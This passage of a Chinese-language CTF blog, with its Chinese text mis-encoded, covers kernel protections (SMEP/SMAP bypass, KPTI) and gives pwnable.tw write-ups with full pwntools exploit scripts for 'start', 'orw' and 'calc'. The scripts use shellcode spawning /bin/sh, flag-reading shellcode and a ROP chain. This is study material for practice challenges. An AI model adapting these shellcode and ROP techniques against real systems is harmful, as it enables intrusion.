<p><strong>STACK PROTECTOR</strong>ï¼šå’Œcanaryç±»ä¼¼ï¼Œç”¨ä»¥æ£€æµ‹æ˜¯å¦å‘ç”Ÿäº†å†…æ ¸å †æ ˆæº¢å‡ºï¼Œå¦‚æœå‘ç”Ÿå†…æ ¸å †æ ˆæº¢å‡ºåˆ™ä¼šäº§ç”Ÿkernel panic.</p>
<p><strong>SMAP/SMEP</strong>:smapçš„ä½œç”¨æ—¶é˜»æ­¢å†…æ ¸ç©ºé—´ç›´æ¥è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œsmepç”¨ä»¥é˜»æ­¢å†…æ ¸ç©ºé—´æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„æ•°æ®ã€‚ç›®çš„æ˜¯è®©å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´å®Œå…¨éš”å¼€ã€‚</p>
<p>ä¸€å…±æœ‰ä¸¤ç§ç»•è¿‡ï¼ˆç…§æ¬ï¼‰</p>
<ul>
<li>åœ¨è®¾è®¡ä¸­ï¼Œä¸ºäº†ä½¿éš”ç¦»çš„æ•°æ®è¿›è¡Œäº¤æ¢æ—¶å…·æœ‰æ›´é«˜çš„æ€§èƒ½ï¼Œéšæ€§åœ°å€å…±äº«å§‹ç»ˆå­˜åœ¨ï¼ˆVDSO &amp; VSYSCALLï¼‰ï¼Œ<strong>ç”¨æˆ·æ€è¿›ç¨‹ä¸å†…æ ¸å…±äº«åŒä¸€å—ç‰©ç†å†…å­˜</strong>ï¼Œå› æ­¤é€šè¿‡éšæ€§å†…å­˜å…±äº«å¯ä»¥å®Œæ•´çš„ç»•è¿‡è½¯ä»¶å’Œç¡¬ä»¶çš„éš”ç¦»ä¿æŠ¤ï¼Œè¿™ç§æ”»å‡»æ–¹å¼è¢«ç§°ä¹‹ä¸º<code>ret2dir</code>ï¼ˆreturn-to-direct-mapped memory ï¼‰</li>
<li>Intelä¸‹ç³»ç»Ÿæ ¹æ®CR4æ§åˆ¶å¯„å­˜å™¨çš„ç¬¬20ä½æ ‡è¯†æ˜¯å¦å¼€å¯SMEPä¿æŠ¤ï¼ˆ1ä¸ºå¼€å¯ï¼Œ0ä¸ºå…³é—­ï¼‰ï¼Œè‹¥æ˜¯èƒ½å¤Ÿé€šè¿‡kernel ROPæ”¹å˜CR4å¯„å­˜å™¨çš„å€¼ä¾¿èƒ½å¤Ÿå…³é—­SMEPä¿æŠ¤ï¼Œå®ŒæˆSMEP-bypassï¼Œæ¥ä¸‹æ¥å°±èƒ½å¤Ÿé‡æ–°è¿›è¡Œret2usr</li>
</ul>
<p><strong>KPTI</strong>ï¼šKPTIå³<code>å†…æ ¸é¡µè¡¨éš”ç¦»</code>ï¼ˆKernel page-table isolationï¼‰ï¼Œå†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´åˆ†åˆ«ä½¿ç”¨ä¸¤ç»„ä¸åŒçš„é¡µè¡¨é›†ï¼Œè¿™å¯¹äºå†…æ ¸çš„å†…å­˜ç®¡ç†äº§ç”Ÿäº†æ ¹æœ¬æ€§çš„å˜åŒ–ï¼ˆå®Œå…¨æ²¡ç†è§£ï¼‰</p>
<h4 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h4><p>å¯è£…è½½å†…æ ¸æ¨¡å—ï¼Œç®€ç§°LKMs,é¡¾åæ€ä¹‰å°±æ˜¯å†…æ ¸ä¸­å¯è£…è½½å¯æ‹†å¸çš„ç¨‹åºï¼Œå¯ä»¥æä¾›å†…æ ¸åŸæœ¬ä¸å…·å¤‡çš„æœåŠ¡åˆä¸è‡³äºé‡æ–°æ›´æ–°æ•´ä¸ªç³»ç»Ÿçš„ä¸œè¥¿ï¼Œä¸€èˆ¬çš„kernelpwné¢˜çš„æ¼æ´éƒ½æ˜¯å‡ºåœ¨å‡ºé¢˜äººè‡ªå·±å†™çš„lkmsä¸Šé¢ã€‚</p>
<ul>
<li><code>lsmod</code>ï¼šåˆ—å‡ºç°æœ‰çš„LKMs</li>
<li><code>insmod</code>ï¼šè£…è½½æ–°çš„LKMï¼ˆéœ€è¦rootï¼‰</li>
<li><code>rmmod</code>ï¼šä»å†…æ ¸ä¸­ç§»é™¤LKMï¼ˆéœ€è¦rootï¼‰</li>
</ul>
<h4 id="å†…æ ¸æ€å‡½æ•°è°ƒç”¨-ç…§æ¬"><a href="#å†…æ ¸æ€å‡½æ•°è°ƒç”¨-ç…§æ¬" class="headerlink" title="å†…æ ¸æ€å‡½æ•°è°ƒç”¨(ç…§æ¬)"></a>å†…æ ¸æ€å‡½æ•°è°ƒç”¨(ç…§æ¬)</h4><ol>
<li><code>printf()</code>å˜æ›´ä¸º**<code>printk()</code>**ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯<code>printk()</code><strong>ä¸ä¸€å®šä¼šæŠŠå†…å®¹æ˜¾ç¤ºåˆ°ç»ˆç«¯ä¸Šï¼Œä½†ä¸€å®šåœ¨å†…æ ¸ç¼“å†²åŒºé‡Œ</strong>ï¼Œå¯ä»¥é€šè¿‡ <code>dmesg</code> æŸ¥çœ‹æ•ˆæœã€‚</li>
<li><code>memcpy()</code>å˜æ›´ä¸º<code>copy_from_user()/copy_to_user()</code><ul>
<li>copy_from_user() å®ç°äº†å°†ç”¨æˆ·ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°å†…æ ¸ç©ºé—´</li>
<li>copy_to_user() å®ç°äº†å°†å†…æ ¸ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°ç”¨æˆ·ç©ºé—´</li>
</ul>
</li>
<li><code>malloc()</code>å˜æ›´ä¸º**<code>kmalloc()</code>**ï¼Œå†…æ ¸æ€çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œå’Œ<code>malloc()</code>ç›¸ä¼¼ï¼Œä½†ä½¿ç”¨çš„æ˜¯ <code>slab/slub</code> åˆ†é…å™¨</li>
<li><code>free()</code>å˜æ›´ä¸º**<code>kfree()</code>**ï¼ŒåŒ <code>kmalloc()</code></li>
</ol>
<p>å¯¹å†…æ ¸çš„æ­å»ºå’Œè®¤è¯†å°±åˆ°è¿™äº†ï¼Œä¸‹é¢è¿›å…¥å®æˆ˜é˜¶æ®µ</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/pwnable.tw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/04/pwnable.tw/" class="post-title-link" itemprop="url">æœªå‘½å</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-02-04 00:44:12" itemprop="dateCreated datePublished" datetime="2022-02-04T00:44:12+08:00">2022-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-02-08 23:16:24" itemprop="dateModified" datetime="2022-02-08T23:16:24+08:00">2022-02-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>title: pwnable.tw<br>date: 2021-11-26 16:02:02<br>tags:</p>
<h1 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h1><p>å¼€å§‹åˆ·pwnable.twçš„é¢˜ï¼Œçœ‹ç•Œé¢æŒºé…·çš„ï¼Œæ„Ÿè§‰éå¸¸æœ‰éš¾åº¦ï¼Œå¸Œæœ›èƒ½åšæŒçš„ä¹…ä¸€ç‚¹ã€‚</p>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>ä¿æŠ¤å…¨å…³ï¼Œç›´æ¥æ ˆä¸Šå†™æ±‡ç¼–å°±è¡Œï¼Œä¸è¿‡ä¸èƒ½ä½¿ç”¨shellcraft.sh()ï¼Œè¿™ä¸ªå¤ªå¤§ï¼Œè‡ªå·±å†™ä¸ªæ±‡ç¼–å°±è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./start&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08048097&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">5</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let\&#x27;s start the CTF:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">stact_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">4</span>+<span class="number">4</span>*<span class="number">5</span>+<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stact_addr)</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 11</span></span><br><span class="line"><span class="string">mov ebx, &#123;0&#125;</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(stact_addr-<span class="number">4</span>-<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">4</span>*<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>)+p32(stact_addr)+shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å†™çš„å¯èƒ½æœ‰ç‚¹éº»çƒ¦ï¼Œä½†å¤§æ¦‚æµç¨‹å°±æ˜¯æ³„éœ²æ ˆåœ°å€ï¼Œç„¶åç›´æ¥asm,è¿™ä¸ªç¨‹åºæœ‰æ„æ€çš„åœ°æ–¹æ˜¯åªæœ‰ä¸¤ä¸ªå‡½æ•°startå’Œexit,ä¸€èˆ¬ç¨‹åºå¯åŠ¨æ—¶çš„è°ƒç”¨è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼Œ_start<code>-&gt; </code>__libc_start_main<code>-&gt;</code>mainï¼Œå…¶ä¸­startå’Œlibc_start_mianæ˜¯gccæ±‡ç¼–çš„æ—¶å€™åŠ è¿›å»çš„ã€‚</p>
<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>æ¥æ”¶ä¸€ä¸ªshellocdeç›´æ¥æ‰§è¡Œï¼Œæ²¡å•¥ä¸œè¥¿ï¼Œä¸è¿‡è¿™ä¸ªæ˜¯åœ¨æ®µä¸Šæ‰§è¡Œï¼Œåœ¨æœ¬åœ°ç«Ÿç„¶æ²¡åŠæ³•æ‰§è¡Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./orw&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x0804858A&#x27;)</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">mov ebx, 0x804a100</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov eax, 3</span></span><br><span class="line"><span class="string">mov ebx, 3</span></span><br><span class="line"><span class="string">mov ecx, 0x804a160</span></span><br><span class="line"><span class="string">mov edx, 0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov eax, 4</span></span><br><span class="line"><span class="string">mov ebx, 1</span></span><br><span class="line"><span class="string">mov ecx, 0x804a160</span></span><br><span class="line"><span class="string">mov edx, 0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&#x27;/home/orw/flag\x00&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç³»ç»Ÿè°ƒç”¨æ—¶i386å’Œamd64æ¥æ”¶å‚æ•°çš„å¯„å­˜å™¨ä¸ä¸€æ ·ï¼Œamd64æ¥æ”¶å‰ä¸‰ä½å‚æ•°çš„å¯„å­˜å™¨åˆ†åˆ«æ˜¯â€™rdi,rsi,rdxâ€™,i386æ˜¯â€™ebx,ecx,edxâ€™ï¼Œå¹³æ—¶çš„i386å‡½æ•°è°ƒç”¨å‚æ•°æ˜¯æ”¾åœ¨æ ˆä¸Šçš„ã€‚</p>
<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p>çœ‹æºç çœ‹å¾—æˆ‘å¤´çš®å‘éº»ï¼Œçœ‹åˆ«äººçš„wpä¹Ÿçœ‹çš„æˆ‘å¤´çš®å‘éº»ï¼Œåº”è¯¥ä¸æ˜¯æˆ‘ç°åœ¨æ°´å¹³èƒ½åšçš„ï¼Œä»¥åå†å›æ¥å¡«å‘å§ã€‚</p>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>ä»£ç æ¯”è¾ƒå¤æ‚ï¼Œçœ‹äº†å¿«ä¸¤ä¸ªå°æ—¶æ‰çœ‹æ‡‚ç®—æ³•çš„æ•´ä¸ªç­–ç•¥ï¼Œå‰åŠä¸ªå¤šå°æ—¶ä¸çŸ¥é“calcæ˜¯è®¡ç®—å™¨çš„æ„æ€ï¼Œçœ‹äº†è€åŠå¤©éƒ½æ²¡çœ‹æ‡‚è¿™ä¸ªç¨‹åºæ˜¯è¦å¹²å•¥çš„ï¼Œåé¢æ‰çŸ¥é“calcæ˜¯è®¡ç®—çš„æ„æ€ï¼Œè¿™ä¸ªç¨‹åºå°±æ˜¯å®Œæˆä¸€ä¸ªç®€å•çš„è®¡ç®—å™¨ï¼Œç­–ç•¥æ˜¯å½“å‰ç¬¦å·æ˜¯+æˆ–è€…-åˆ™ç®—ä¸Šä¸€æ¬¡çš„ç¬¦å·ï¼Œç„¶åæŠŠå½“å‰ç¬¦å·å‹æ ˆï¼Œå¦‚æœæ˜¯%,*,/å°±çœ‹ä¸Šä¸€æ¬¡ç¬¦å·æ˜¯ä¸æ˜¯+,-,å¦‚æœæ˜¯çš„è¯ï¼ŒæŠŠå½“å‰ç¬¦å·å‹æ ˆï¼Œå¦‚æœä¸æ˜¯çš„è¯ç®—ä¸Šä¸€æ¬¡çš„ç¬¦å·ï¼Œç„¶åæŠŠå½“å‰ç¬¦å·å‹æ ˆã€‚ç­–ç•¥æ˜¯ææ¸…æ¥šäº†ï¼Œä½†æ˜¯æ¼æ´è¿˜æ²¡æ‰¾è§ğŸ¤¦â€â™€ï¸ğŸ¤¦â€â™€ï¸ğŸ¤¦â€â™€ï¸ğŸ¤¦â€â™€ï¸</p>
<p>å‘ç°äº†ä¸€ä¸ªç›²ç‚¹ï¼Œè¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªå€¼å¯ä»¥æ˜¯ç¬¦å·ï¼Œæˆ‘ç¨å¾®è¯•äº†ä¸€ä¸‹ï¼Œå½“å‡ºç°â€™-8-8â€™ï¼Œå°±ä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼ŒğŸ˜ƒğŸ˜ƒğŸ˜ƒæœ‰æ¯”è¾ƒæ˜ç¡®çš„æ€è·¯äº†</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+360+1</span><br><span class="line">-5105367</span><br><span class="line"></span><br><span class="line">æ®µé”™è¯¯ (æ ¸å¿ƒå·²è½¬å‚¨)</span><br></pre></td></tr></table></figure>

<p>å†æ—¶äº”å…­ä¸ªå°æ—¶ï¼Œç»ˆäºåšå‡ºæ¥äº†ï¼Œæ¼æ´å°±æ˜¯ä¸Šé¢é‚£ä¸ªæ ·å­ï¼Œä¸è¿‡å¾—å·§å¦™åˆ©ç”¨æ‰è¡Œï¼Œæœ€åä¿®æ”¹calcå‡½æ•°çš„è¿”å›åœ°å€ä¸ºæ„é€ çš„rop,æœ€åæˆåŠŸgetshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./calc&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08049433&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x08049a21: int 0x80;</span></span><br><span class="line"><span class="string">0x0805c34b: pop eax; ret;</span></span><br><span class="line"><span class="string">0x08070880: int 0x80; ret; </span></span><br><span class="line"><span class="string">0x080481d1: pop ebx; ret;</span></span><br><span class="line"><span class="string">0x080701d1: pop ecx; pop ebx; ret; </span></span><br><span class="line"><span class="string">0x080701aa: pop edx; ret;</span></span><br><span class="line"><span class="string">0x080bc4f6: pop esp; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_eax=<span class="number">0x0805c34b</span></span><br><span class="line">pop_esp=<span class="number">0x080bc4f6</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x080701d1</span></span><br><span class="line">int80=<span class="number">0x08070880</span></span><br><span class="line">pop_edx=<span class="number">0x080701aa</span></span><br><span class="line">bss_addr=<span class="number">0x80eb000</span></span><br><span class="line">rop_read=[pop_eax,<span class="number">3</span>,pop_ecx_ebx,bss_addr,<span class="number">0</span>,pop_edx,<span class="number">0x50</span>,int80,pop_esp,bss_addr+<span class="number">0x10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_build</span>(<span class="params">rop</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;+360+1&#x27;</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop)):</span><br><span class="line">        m=<span class="number">361</span>+i</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;-1&#x27;</span>.<span class="built_in">format</span>(m)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;+&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m,rop[i])</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;-&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m+<span class="number">1</span>,rop[i]-<span class="number">1</span>)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload=<span class="string">&#x27;+360+1&#x27;</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line">    rop_build(rop_read)</span><br><span class="line">    sh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(pop_eax)+p32(<span class="number">11</span>)</span><br><span class="line">    payload+=p32(pop_ecx_ebx)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(pop_edx)+p32(<span class="number">0</span>)</span><br><span class="line">    payload+=p32(int80)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬å†™çš„æ¯”è¾ƒå¤æ‚ï¼Œä¼°è®¡å‡ å¤©åæˆ‘æ¥çœ‹ä¹Ÿçœ‹ä¸æ‡‚äº†ï¼Œä¸è¿‡è‡³ä»Šè¿˜æ²¡çœ‹è¿‡åˆ«äººçš„wp,éƒ½æ˜¯è‡ªå·±æå‡ºæ¥çš„ğŸ˜Š</p>
<h2 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h2><p>ç»§ç»­å¼€åˆ·ï¼Œè¿™ä¸ªç¨‹åºå’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ä¹Ÿæ˜¯é™æ€é“¾æ¥ï¼Œè€Œä¸”è¿˜æ²¡æœ‰ç¬¦å·è¡¨ï¼Œè¿mainå‡½æ•°éƒ½æ˜¯æˆ‘é€šè¿‡å­—ç¬¦ä¸²æ‰¾åˆ°çš„ï¼Œmainå‡½æ•°çš„ä»£ç æ¯”è¾ƒç®€å•ï¼Œæä¾›äº†ä¸€æ¬¡ä»»æ„å†™</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  char *v4; // [rsp+8h] [rbp-28h]</span><br><span class="line">  char buf[<span class="number">24</span>]; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  result = (unsigned __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1u, <span class="string">&quot;addr:&quot;</span>, 5uLL);</span><br><span class="line">    read(<span class="number">0</span>, buf, 0x18uLL);</span><br><span class="line">    v4 = (char *)(<span class="built_in">int</span>)sub_40EE70((__int64)buf);</span><br><span class="line">    write(1u, <span class="string">&quot;data:&quot;</span>, 5uLL);</span><br><span class="line">    read(<span class="number">0</span>, v4, 0x18uLL);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(0x28u) != v6 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯é™æ€é“¾æ¥ï¼Œæ‰€ä»¥æ²¡æœ‰pltå’Œgot,æ²¡æ³•ç›´æ¥æ”¹å‡½æ•°åœ°å€å®Œæˆæ”»å‡»ï¼Œéš¾æã€‚ğŸ¤¦â€â™€ï¸</p>
<p>çœ‹äº†å¿«ä¸¤ä¸ªå°æ—¶æ²¡æœ‰çœ‹å‡ºæ¥åº”è¯¥ç”¨è¿™ä¸ªä»»æ„å†™æ€ä¹ˆæ”»å‡»è¿™ä¸ªç¨‹åºï¼Œçœ‹äº†åˆ«äººçš„åšå®¢æç„¶å¤§æ‚Ÿï¼ŒåŸæ¥æ˜¯æ”¹fini_arrayçš„å€¼ï¼Œç±»ä¼¼çš„é¢˜æˆ‘ä¹‹å‰åœ¨æ”»é˜²ä¸–ç•Œä¸Šçœ‹è¿‡ï¼Œä½†æ˜¯æ²¡æœ‰è¿™ä¸ªéš¾ï¼Œé‚£ä¸ªå°±æ˜¯æ”¹fini_arrayçš„ä¸€ä¸ªæŒ‡é’ˆä¸ºåé—¨å‡½æ•°çš„åœ°å€ç„¶åè°ƒç”¨ï¼Œè¿™ä¸ªæ²¡æœ‰åé—¨å‡½æ•°ï¼Œå°±ç®—æœ‰å› ä¸ºæ²¡æœ‰ç¬¦å·è¡¨ä½ ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œè€Œä¸”éƒ½è¿˜æ˜¯syscallè°ƒç”¨ï¼Œä¹Ÿä¸èƒ½å†™shellcodeï¼Œåªèƒ½rop,èƒ½æƒ³åˆ°è¿™å…¶å®ä¹Ÿåªæ˜¯å¼€å¤´ï¼Œæœ€éš¾çš„è¿˜æ˜¯æ€ä¹ˆæ„é€ ropï¼Œä¸”å®¹æˆ‘ä»å¤´ç»†ç»†é“æ¥ã€‚</p>
